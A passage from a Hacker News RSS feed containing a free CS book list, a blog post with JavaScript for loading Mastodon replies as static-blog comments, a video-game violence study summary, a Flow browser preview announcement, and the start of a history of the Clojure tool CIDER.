  <li><a href="http://ocw.mit.edu/resources/res-6-004-principles-of-computer-system-design-an-introduction-spring-2009/online-textbook/">Principles of Computer System Design</a> (Authors share second half online, first half published in print by Elsevier)</li>
  <li><a href="http://webdam.inria.fr/Alice/">Foundations of Databases</a></li>
  <li><a href="http://www.cl.cam.ac.uk/~rja14/book.html">Security Engineering: A Guide to Building Dependable Distributed Systems</a></li>
  <li><a href="http://cnp3book.info.ucl.ac.be/">Computer Networking</a></li>
  <li><a href="http://www.sigcomm.org/content/ebook">Recent Advances in Networking, Volume 1</a></li>
  <li><a href="http://perfeval.epfl.ch/index.htm">Performance Evaluation Of Computer And Communication Systems</a></li>
  <li><a href="http://ica1www.epfl.ch/PS_files/NetCal.htm">The Network Calculus Book</a></li>
  <li>*<a href="https://www.systemsapproach.org/book.html">Computer Networking: A Systems Approach</a></li>
  <li><a href="https://nebelwelt.net/SS3P/">Software Security: Principles, Policies, and Protection</a></li>
  <li><a href="http://ecee.colorado.edu/~bart/book/book/index.html">Principles of Electronic Devices</a></li>
  <li><a href="https://www.netbsd.org/docs/internals/en/index.html">NetBSD Internals</a></li>
  <li><a href="https://www.cl.cam.ac.uk/~jac22/otalks/ods.pdf">Open Distributed Systems</a></li>
  <li><a href="https://www.distributedconsensus.net/">Foundations of Distributed Consensus and Blockchains</a></li>
</ul>

<h2 id="general-cs-theory-and-algorithms-including-ai-ml-data-science">General CS Theory and Algorithms (including AI, ML, Data Science…)</h2>

<ul>
  <li><a href="http://infolab.stanford.edu/~ullman/focs.html">Foundations of Computer Science</a></li>
  <li><a href="http://www.princeton.edu/~rvdb/LPbook/">Linear Programming: Foundations and Extensions</a></li>
  <li><a href="http://www.designofapproxalgs.com/">The Design of Approximation Algorithms</a></li>
  <li><a href="http://www.mmds.org/">Mining of Massive Datasets</a></li>
  <li><a href="http://mbmlbook.com/">Model-Based Machine Learning</a></li>
  <li><a href="https://www.microsoft.com/en-us/research/publication/foundations-of-data-science/">Foundations of Data Science</a></li>
  <li><a href="http://greenteapress.com/wp/think-data-structures/">Think Data Structures</a></li>
  <li><a href="http://greenteapress.com/wp/think-bayes/">Think Bayes: Bayesian Statistics Made Simple</a></li>
  <li><a href="https://greenteapress.com/wp/think-stats-2e/">Think Stats</a></li>
  <li><a href="https://www.cambridge.org/us/academic/subjects/computer-science/algorithmics-complexity-computer-algebra-and-computational-g/algorithmic-game-theory">Algorithmic Game Theory</a>
    <ul>
      <li>This one’s a bit awkward to find: Click on the “Resources” tab (right of Description and
  Contents), and in the resulting “General Resources” side-bar that appears to the left, click
  on the book title.  In the table that appears, click where the book title appears under the
  “Name” column; this is the full PDF of the book.</li>
    </ul>
  </li>
  <li><a href="https://muse.jhu.edu/book/60836">Reinforcement Learning: An Introduction</a> (also, direct PDF of
  author preprint of 2nd edition <a href="http://incompleteideas.net/book/bookdraft2018mar21.pdf">here</a>)</li>
  <li><a href="http://incompleteideas.net/book/the-book-2nd.html">Reinforcement Learning: An Introduction, 2nd Edition</a></li>
  <li><a href="https://muse.jhu.edu/book/60833">Machine Learning for Data Streams: with Practical Examples in MOA</a></li>
  <li><a href="https://fairmlbook.org/">Fairness and Machine Learning</a></li>
  <li><a href="http://www.deeplearningbook.org/">Deep Learning</a></li>
  <li><a href="http://www.algorithmsilluminated.org/">Algorithms Illuminated</a></li>
  <li><a href="https://seeing-theory.brown.edu/index.html">Seeing Theory: A Visual Introduction to Probability and Statistics</a></li>
  <li><a href="https://mml-book.github.io/">Mathematics for Machine Learning</a></li>
  <li><a href="https://web.engr.oregonstate.edu/~rosulekm/crypto/">The Joy of Cryptography</a></li>
  <li><a href="http://people.cs.bris.ac.uk/~nigel/Crypto_Book/">Cryptography, An Introduction</a></li>
  <li><a href="https://toc.cryptobook.us/">A Graduate Course in Applied Cryptography</a></li>
  <li><a href="http://neuralnetworksanddeeplearning.com/">Neural Networks and Deep Learning</a></li>
  <li><a href="https://qiskit.org/textbook/preface.html">Learn Quantum Computing using Qiskit</a></li>
  <li><a href="http://masfoundations.org/download.html">Multiagent Systems: Algorithmic, Game-Theoretic, and Logical Foundations</a></li>
  <li><a href="http://d2l.ai/">Dive into Deep Learning</a></li>
  <li><a href="http://discrete.openmathbooks.org/dmoi3.html">Discrete Mathematics: An Open Introduction, 3rd Edition</a></li>
  <li><a href="http://cs.brown.edu/people/jsavage/book/">Models Of Computation</a></li>
  <li><a href="http://diestel-graph-theory.com/index.html">Graph Theory</a></li>
  <li>*<a href="http://theory.cs.princeton.edu/complexity/">Computational Complexity: A Modern Approach (draft)</a></li>
  <li><a href="https://www.cis.upenn.edu/~aaroth/privacybook.html">The Algorithmic Foundations of Differential Privacy</a></li>
</ul>



<ul>
  <li><a href="http://vmls-book.stanford.edu/">Introduction to Applied Linear Algebra: Vectors, Matrices, and Least Squares</a></li>
  <li><a href="https://www.hsph.harvard.edu/miguel-hernan/causal-inference-book/">The Causal Inference Book</a></li>
  <li><a href="http://faculty.marshall.usc.edu/gareth-james/ISL/">An Introduction to Statistical Learning, with Applications in R</a></li>
  <li><a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning: Data Mining, Inference, and Prediction</a></li>
  <li><a href="http://linear.axler.net/">Linear Algebra Abridged</a> (Linear Algebra Done Right, minus proofs)</li>
  <li><a href="http://statsthinking21.org/index.html">Statistical Thinking for the 21st Century</a></li>
  <li><a href="http://web.stanford.edu/~boyd/cvxbook/">Convex Optimization</a></li>
  <li><a href="https://archive.org/details/AnIntroductionToProbabilityTheoryAndItsApplicationsVolume1">An Introduction to Probability Theory and its Applications</a></li>
  <li>[Numerical Linear Algebra] (https://people.maths.ox.ac.uk/trefethen/text.html)</li>
</ul>

<h2 id="computational-linguistics--natural-language-processing">Computational Linguistics &amp; Natural Language Processing</h2>

<ul>
  <li><a href="https://linguistics.ucla.edu/people/Kracht/courses/compling2-2007/formal.pdf">The Mathematics of Language</a> (<a href="https://linguistics.ucla.edu/people/Kracht/courses/compling2-2007/cl2007.html">via author’s homepage</a>)</li>
  <li><a href="https://www.fulcrum.org/concern/monographs/6h440s98b">The Syntactic Process</a></li>
  <li><a href="https://web.stanford.edu/~jurafsky/slp3/">Speech and Language Processing</a></li>
  <li><a href="https://github.com/jacobeisenstein/gt-nlp-class/tree/master/notes">Natural Language Processing</a></li>
  <li><a href="https://www.tidytextmining.com/">Text Mining with R</a></li>
  <li><a href="http://www.nltk.org/book/">Natural Language Processing with Python: Analyzing Text with the Natural Language Toolkit (NLTK)</a></li>
</ul>

<h2 id="education">Education</h2>

<ul>
  <li><a href="http://grid.cs.gsu.edu/~tcpp/curriculum/?q=cedr_book">Topics in Parallel and Distributed Computing: Introducing Concurrency in Undergraduate Courses</a> (preprint)</li>
</ul>

<h2 id="language-focused-introductions-to-computer-science">Language-Focused Introductions to Computer Science</h2>

<ul>
  <li><a href="http://mitpress.mit.edu/sicp/full-text/book/book.html">Structure and Interpretation of Computer Programs</a>
  (also: <a href="http://sicpebook.wordpress.com/ebook/">Unofficial PDF Ebook Reformatting</a>,
  and <a href="http://sicpinclojure.com/">SICP in Clojure</a>)</li>
  <li><a href="http://www.ccs.neu.edu/home/matthias/htdc.html">How to Design Classes (draft)</a></li>
  <li><a href="https://htdp.org/2018-01-06/">How to Design Programs (2nd Edition)</a></li>
  <li><a href="https://htdp.org/2003-09-26/">How to Design Programs (1st Edition)</a></li>
</ul>

<h2 id="specific-programming-languages">Specific Programming Languages</h2>

<p>While most of the books on this page are focused on more theoretical/foundational topics, sometimes you just need
to learn a programming language or look at some reference on a particular language feature.</p>
</div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://csgordon.github.io/books.html">https://csgordon.github.io/books.html</a></em></p>]]>
            </description>
            <link>https://csgordon.github.io/books.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25572852</guid>
            <pubDate>Tue, 29 Dec 2020 18:14:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adding comments to a static blog with Mastodon]]>
            </title>
            <description>
<![CDATA[
Score 263 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25570268">thread link</a>) | @ognarb
<br/>
December 29, 2020 | https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/ | <a href="https://web.archive.org/web/*/https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>

    
</header>


  <section>
    <p>One of the biggest disadvantages of static site generators is that
they are static and can’t include comments.</p>
<p>There are multiples solutions to solve this problem. You could add
a third party blog engine like Disqus, but this has the drawback
of including a third-party tool with a bad privacy record in your
website. Another solution would be to host an open-source alternative
but this comes at the cost of a higher maintenance burden. Having
to host a database was something we wanted to avoid with a
static site generator.</p>
<p>In my opinion, a better solution is to leverage the Mastodon and
Fediverse platform. Mastodon is a decentralized social network
and it allows people to communicate with each other without
being on the same server. It is inspired by Twitter, but instead
of tweeting, you write toot.</p>
<p>When publishing an article, you now only need to also write a
simple toot linking to your article. Then Mastodon has a simple
API to fetch the answer to your toot. This is the code I made for
my Hugo powered blog, but it is easily adaptable for other static
site generators. It will create a button to load comments instead
of loading them for every visitor so that it decreases the load on your
mastodon server.</p>
<div><pre><code data-lang="html">{{ with .Params.comments }}
<span>&lt;</span><span>div</span> <span>class</span><span>=</span><span>"article-content"</span><span>&gt;</span>
  <span>&lt;</span><span>h2</span><span>&gt;</span>Comments<span>&lt;/</span><span>h2</span><span>&gt;</span>
  <span>&lt;</span><span>p</span><span>&gt;</span>You can use your Mastodon account to reply to this <span>&lt;</span><span>a</span> <span>class</span><span>=</span><span>"link"</span> <span>href</span><span>=</span><span>"https://{{ .host }}/@{{ .username }}/{{ .id }}"</span><span>&gt;</span>post<span>&lt;/</span><span>a</span><span>&gt;</span>.<span>&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>p</span><span>&gt;&lt;</span><span>a</span> <span>class</span><span>=</span><span>"button"</span> <span>href</span><span>=</span><span>"https://{{ .host }}/interact/{{ .id }}?type=reply"</span><span>&gt;</span>Reply<span>&lt;/</span><span>a</span><span>&gt;&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>p</span> <span>id</span><span>=</span><span>"mastodon-comments-list"</span><span>&gt;&lt;</span><span>button</span> <span>id</span><span>=</span><span>"load-comment"</span><span>&gt;</span>Load comments<span>&lt;/</span><span>button</span><span>&gt;&lt;/</span><span>p</span><span>&gt;</span>
  <span>&lt;</span><span>noscript</span><span>&gt;&lt;</span><span>p</span><span>&gt;</span>You need JavaScript to view the comments.<span>&lt;/</span><span>p</span><span>&gt;&lt;/</span><span>noscript</span><span>&gt;</span>
  <span>&lt;</span><span>script</span> <span>src</span><span>=</span><span>"/assets/js/purify.min.js"</span><span>&gt;&lt;/</span><span>script</span><span>&gt;</span>
  <span>&lt;</span><span>script</span> <span>type</span><span>=</span><span>"text/javascript"</span><span>&gt;</span>
    <span>function</span> <span>escapeHtml</span><span>(</span><span>unsafe</span><span>)</span> <span>{</span>
      <span>return</span> <span>unsafe</span>
           <span>.</span><span>replace</span><span>(</span><span>/&amp;/g</span><span>,</span> <span>"&amp;amp;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/&lt;/g</span><span>,</span> <span>"&amp;lt;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/&gt;/g</span><span>,</span> <span>"&amp;gt;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/"/g</span><span>,</span> <span>"&amp;quot;"</span><span>)</span>
           <span>.</span><span>replace</span><span>(</span><span>/'/g</span><span>,</span> <span>"&amp;#039;"</span><span>);</span>
   <span>}</span>

    <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"load-comment"</span><span>).</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>function</span><span>()</span> <span>{</span>
      <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"load-comment"</span><span>).</span><span>innerHTML</span> <span>=</span> <span>"Loading"</span><span>;</span>
      <span>fetch</span><span>(</span><span>'https://{{ .host }}/api/v1/statuses/{{ .id }}/context'</span><span>)</span>
        <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>response</span><span>)</span> <span>{</span>
          <span>return</span> <span>response</span><span>.</span><span>json</span><span>();</span>
        <span>})</span>
        <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>data</span><span>)</span> <span>{</span>
          <span>if</span><span>(</span><span>data</span><span>[</span><span>'descendants'</span><span>]</span> <span>&amp;&amp;</span>
             <span>Array</span><span>.</span><span>isArray</span><span>(</span><span>data</span><span>[</span><span>'descendants'</span><span>])</span> <span>&amp;&amp;</span> 
            <span>data</span><span>[</span><span>'descendants'</span><span>].</span><span>length</span> <span>&gt;</span> <span>0</span><span>)</span> <span>{</span>
              <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>innerHTML</span> <span>=</span> <span>""</span><span>;</span>
              <span>data</span><span>[</span><span>'descendants'</span><span>].</span><span>forEach</span><span>(</span><span>function</span><span>(</span><span>reply</span><span>)</span> <span>{</span>
                <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span> <span>=</span> <span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>);</span>
                <span>reply</span><span>.</span><span>account</span><span>.</span><span>emojis</span><span>.</span><span>forEach</span><span>(</span><span>emoji</span> <span>=&gt;</span> <span>{</span>
                  <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span> <span>=</span> <span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>.</span><span>replace</span><span>(</span><span>`:</span><span>${</span><span>emoji</span><span>.</span><span>shortcode</span><span>}</span><span>:`</span><span>,</span>
                    <span>`&lt;img src="</span><span>${</span><span>escapeHtml</span><span>(</span><span>emoji</span><span>.</span><span>static_url</span><span>)</span><span>}</span><span>" alt="Emoji </span><span>${</span><span>emoji</span><span>.</span><span>shortcode</span><span>}</span><span>" height="20" width="20" /&gt;`</span><span>);</span>
                <span>});</span>
                <span>mastodonComment</span> <span>=</span>
                  <span>`&lt;div class="mastodon-comment"&gt;
</span><span>                     &lt;div class="avatar"&gt;
</span><span>                       &lt;img src="</span><span>${</span><span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>avatar_static</span><span>)</span><span>}</span><span>" height=60 width=60 alt=""&gt;
</span><span>                     &lt;/div&gt;
</span><span>                     &lt;div class="content"&gt;
</span><span>                       &lt;div class="author"&gt;
</span><span>                         &lt;a href="</span><span>${</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>url</span><span>}</span><span>" rel="nofollow"&gt;
</span><span>                           &lt;span&gt;</span><span>${</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>display_name</span><span>}</span><span>&lt;/span&gt;
</span><span>                           &lt;span class="disabled"&gt;</span><span>${</span><span>escapeHtml</span><span>(</span><span>reply</span><span>.</span><span>account</span><span>.</span><span>acct</span><span>)</span><span>}</span><span>&lt;/span&gt;
</span><span>                         &lt;/a&gt;
</span><span>                         &lt;a class="date" href="</span><span>${</span><span>reply</span><span>.</span><span>uri</span><span>}</span><span>" rel="nofollow"&gt;
</span><span>                           </span><span>${</span><span>reply</span><span>.</span><span>created_at</span><span>.</span><span>substr</span><span>(</span><span>0</span><span>,</span> <span>10</span><span>)</span><span>}</span><span>
</span><span>                         &lt;/a&gt;
</span><span>                       &lt;/div&gt;
</span><span>                       &lt;div class="mastodon-comment-content"&gt;</span><span>${</span><span>reply</span><span>.</span><span>content</span><span>}</span><span>&lt;/div&gt; 
</span><span>                     &lt;/div&gt;
</span><span>                   &lt;/div&gt;`</span><span>;</span>
                <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>appendChild</span><span>(</span><span>DOMPurify</span><span>.</span><span>sanitize</span><span>(</span><span>mastodonComment</span><span>,</span> <span>{</span><span>'RETURN_DOM_FRAGMENT'</span><span>:</span> <span>true</span><span>}));</span>
              <span>});</span>
          <span>}</span> <span>else</span> <span>{</span>
            <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>'mastodon-comments-list'</span><span>).</span><span>innerHTML</span> <span>=</span> <span>"&lt;p&gt;Not comments found&lt;/p&gt;"</span><span>;</span>
          <span>}</span>
        <span>});</span>
      <span>});</span>
  <span>&lt;/</span><span>script</span><span>&gt;</span>
<span>&lt;/</span><span>div</span><span>&gt;</span>
{{ end }}
</code></pre></div><p>This code is using <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">DOMPurify</a>
to sanitize the input, since it is not a great idea to load data from
third party sources without sanitizing them first. Also thanks to
<a href="https://news.ycombinator.com/item?id=25575111" target="_blank" rel="noopener">chrismorgan</a>, the code
was optimized and is more secure.</p>
<p>In my blog post, I can now add the following information to my
frontmatter, to make comments appears magically.</p>
<div><pre><code data-lang="yaml"><span>comments</span><span>:</span><span>
</span><span>  </span><span>host</span><span>:</span><span> </span><span>linuxrocks.online</span><span>
</span><span>  </span><span>username</span><span>:</span><span> </span><span>carl</span><span>
</span><span>  </span><span>id</span><span>:</span><span> </span><span>105105837504372590</span><span>
</span></code></pre></div>
</section>


  
  <div>
    <h2>Comments</h2>
    <p>You can use your Mastodon account to reply to this <a href="https://linuxrocks.online/@carl/105463655803971969">post</a>.</p>
    <p><a href="https://linuxrocks.online/interact/105463655803971969?type=reply">Reply</a></p>
    
    
    
    
  </div>
  

  

  
</article></div>]]>
            </description>
            <link>https://carlschwan.eu/2020/12/29/adding-comments-to-your-static-blog-with-mastodon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570268</guid>
            <pubDate>Tue, 29 Dec 2020 14:57:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ten year study: No link between violent video games and aggressive behavior]]>
            </title>
            <description>
<![CDATA[
Score 970 | Comments 513 (<a href="https://news.ycombinator.com/item?id=25570038">thread link</a>) | @chops
<br/>
December 29, 2020 | https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life | <a href="https://web.archive.org/web/*/https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <div><p>A <span><a title="Longitudinal Study into Violent Video Games" href="https://www.liebertpub.com/doi/abs/10.1089/cyber.2020.0049">ten-year longitudinal study</a></span>&nbsp;published in the Journal of <em>Cyberpsychology, Behavior, and Social Networking</em> on a group in early adolescence from as young as ten years old, investigated how playing violent video games at an early age would translate into adulthood behavior (23 years of age). Titled "Growing Up with Grand Theft Auto: A 10-Year Study of Longitudinal Growth of Violent Video Game Play in Adolescents" the study found no correlation between growing up playing video games and increased levels of aggression ten years later.</p><p>This particular study utilized a more contemporary approach for analyzing its data, known as the person-centered approach. Traditional studies use a variable-centered approach whereby researchers treat each variable, or characteristic, as related to another variable. An example would be that exercising is related to a reduced incidence of heart disease. This has been particularly valuable when comparing groups. In a person-centered approach researchers combine various algorithms across variables to determine how these variables compare among individuals. This approach provides a more accurate depiction of how variables relate to the individual.</p><p>As such, this study “accounts for heterogeneity, grouping individuals who are similar and who share a set of characteristics that vary similarly over time.” Participant families were recruited through “a large north-western city” beginning in 2007 (Wave 1) via telephone directories and required to complete questionnaires. 65% were Caucasian, 12% black and 19% multi-ethnic, 4% other. Families of lower socioeconomic status were underrepresented as part of the initial sample group and therefore needed recruitment via referrals and fliers to add to and diversify the sample group.</p><p>Video game violence ratings were assessed through the Common Sense Media, known to be a viable rating body for media. Participants were assessed through various behavioral characteristics such as aggression, depressive symptoms, anxiety symptoms, and prosocial behavior.</p><p>Results showed that boys played more violent video games than girls. Groups displayed three forms of video game play, according to the study: high-initial violence (4%) which indicated individuals played a high-level of violent video games at an early age, moderate initial violence (23%) whereby violent video game play was moderate at an early age, and low initial violence (73%).</p><p>The study concluded that group with low initial violence “was no higher in aggressive behavior than the high initial violence group at the final time point.” Therefore, it is determined that adolescents who played a high-level of violent video games at an early age did not show more aggressive behavior later in life than those who played fewer to no hours of violent video games at an early age.</p></div>
    </div></div>]]>
            </description>
            <link>https://gamesage.net/blogs/news/ten-year-long-study-confirms-no-link-between-playing-violent-video-games-as-early-as-ten-years-old-and-aggressive-behavior-later-in-life</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570038</guid>
            <pubDate>Tue, 29 Dec 2020 14:31:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Four years of profitable side-projects]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 25 (<a href="https://news.ycombinator.com/item?id=25569562">thread link</a>) | @czue
<br/>
December 29, 2020 | https://www.coryzue.com/open/ | <a href="https://web.archive.org/web/*/https://www.coryzue.com/open/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
    
    
    <div>
      <div>
        <p>$<span id="total-profits">-</span></p>
        <p>Total Profit</p>
      </div>
      <div>
        <p><span id="total-hours">-</span></p>
        <p>Total Hours</p>
      </div>
      <div>
        <p>$<span id="total-rate">-</span><span>/hour</span></p>
        <p>Effective Rate</p>
      </div>
    </div>
    <div>
      <div>
        <p>Profits by Year</p>
        <canvas id="yearly-profits"></canvas>
      </div>
      <div>
        <p>Effort by Year</p>
        <canvas id="yearly-hours"></canvas>
      </div>
    </div>
    <div>
      <div id="placecard-data">
        <h2>❤️ <a href="https://www.placecard.me/" target="_blank">Place
          Card Me</a></h2>
        <h3>The best way to make place cards online.</h3>
        <h3>🚀 May 2017 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr </h3>
        
        
        
      </div>
      <div id="pegasus-data">
        <h2>🦄 <a href="https://www.saaspegasus.com/" target="_blank">SaaS
          Pegasus</a></h2>
        <h3>A Django-Powered SaaS Template for your next big
          idea.</h3>
        <h3>🚀 June 2019 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr</h3>
        
        
        
      </div>
      <div id="chatstats-data">
        <h2>💬 <a href="https://chatstats.co/" target="_blank">Chat
          Stats</a></h2>
        <h3>Analytics and leaderboards for your GroupMe groups.</h3>
        <h3>🚀 Dec 2017 — 💰 $<span></span>
          — 🕒 <span></span> Hours — 💸 $<span></span>/hr</h3>
        
        
        
      </div>
    </div>
    
  </div>
</section></div>]]>
            </description>
            <link>https://www.coryzue.com/open/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569562</guid>
            <pubDate>Tue, 29 Dec 2020 13:30:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flow Browser Preview on the Raspberry Pi 400]]>
            </title>
            <description>
<![CDATA[
Score 156 | Comments 61 (<a href="https://news.ycombinator.com/item?id=25568650">thread link</a>) | @hotpoodle
<br/>
December 29, 2020 | https://www.ekioh.com/blog/flow-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://www.ekioh.com/blog/flow-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4917" role="article" itemscope="" itemtype="http://schema.org/BlogPosting">
						
	<header>	
		
		
	    </header> <!-- end article header -->
					
    <section itemprop="articleBody">
				<p>We’re very excited to be making a <a href="https://support.ekioh.com/download/">Flow preview</a> available for public download for the first time. Flow has a fast, modern, architecture that doesn’t share its layout engine with any other browser. While able to render most websites well, many perfectly, Flow still has some way to go. Each month more pages work, as more JavaScript APIs are added or additional CSS functionality created.</p>
<p><a href="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png"><img src="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png" alt="Flow running on a Raspberry Pi 400" width="1024" height="576" srcset="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png 1024w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-300x169.png 300w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-768x432.png 768w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1536x864.png 1536w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p>
<p><span id="more-4917"></span>We have chosen to release on just one platform initially, and there are a couple of reasons why. The Raspberry Pi’s hardware is largely fixed – you can’t swap the CPU or GPU. Variations in hardware could cause us to get distracted by issues that really shouldn’t be a priority right now.</p>
<p>Secondly, the Raspberry Pi 400 has very similar performance to many set-top box chips, so a release that demonstrates Flow’s animation performance on embedded hardware is more useful than on a PC where all browsers can easily get 60fps.</p>
<p>It’s been a year since our <a href="https://www.ekioh.com/devblog/full-google-mail-in-a-clean-room-browser/">Google Mail</a> blog post was picked up on <a href="https://twitter.com/FlowBrowser/status/1200070712121348096" data-wplink-edit="true">Twitter</a> and <a href="https://news.ycombinator.com/">Hacker News</a>. Our unexpected sudden fame meant we weren’t prepared for a public browser release, and expectations were (and probably still are) unrealistically high. Most of the HTML user interfaces that we had tried rendered well, and Flow regularly outperformed other browsers on set-top boxes. But, websites never looked quite right.</p>
<p>Last September, we detailed <a href="https://www.ekioh.com/devblog/can-we-fix-it/">our work</a> on tracking down and fixing the rendering of various major websites. No one bug was particularly tricky to fix once we had narrowed it down, but the end result made the browser engine feel much more like an actual browser.</p>
<p>In the meantime, some previously working sites have stopped working due to improvements in their content, for instance, Amazon now requires Web Cryptography to log in. This is a feature currently in progress.</p>
<p>This preview has many features missing that you would reasonably expect from a browser. Media source extensions, cryptography, and CSS Grid are being actively worked on. We have plenty more to get on with, including a UI, accessibility, and better text editing functionality.</p>
<p>We generally know which sites work and which don’t, but prioritise our commercial customers. Bug fixes that impact them usually fix websites, just not necessarily your favourite website. If you are able to help us track down why a particular website (or library) fails to work, we would be very appreciative of a small test case demonstrating the bug. The more simple the test case is, the more likely we are to fix the bug. We will read all emails but, sadly, may not be able to reply.</p>
<p>And finally, while the preview is for the Raspberry Pi 400, it also works on the Raspberry Pi 4. Previous models use a different GPU with different GPU drivers, so we are holding off releasing for those until we have optimised the graphics support.</p>
<p>We hope this preview demonstrates where we are with a brand new browser engine. The feedback we get for this public preview will directly affect the prospects for desktop platforms. Enjoy it, be critical, but please don’t expect Flow to be usable on your favourite websites right now.</p>
<hr>
<p>If you’d like to automatically receive our posts by email please&nbsp;<a href="https://www.ekioh.com/blogregister/">join our mailing list</a>.</p>
<!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><!-- AddThis Share Buttons generic via filter on the_content -->	</section> <!-- end article section -->
						
	 <!-- end article footer -->
						
	
<!-- #comments -->	
													
</article></div>]]>
            </description>
            <link>https://www.ekioh.com/blog/flow-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568650</guid>
            <pubDate>Tue, 29 Dec 2020 10:58:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cider 1.0]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25568181">thread link</a>) | @rayxi271828
<br/>
December 29, 2020 | https://metaredux.com/posts/2020/12/28/cider-1-0.html | <a href="https://web.archive.org/web/*/https://metaredux.com/posts/2020/12/28/cider-1-0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>You can’t really know where you are going until you know where you have been.</p>

  <p>– Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don’t remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren’t many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software…</p>

<p>Tim King came across Phil’s post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project’s
steward ever since. Third time’s a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I’m fairly
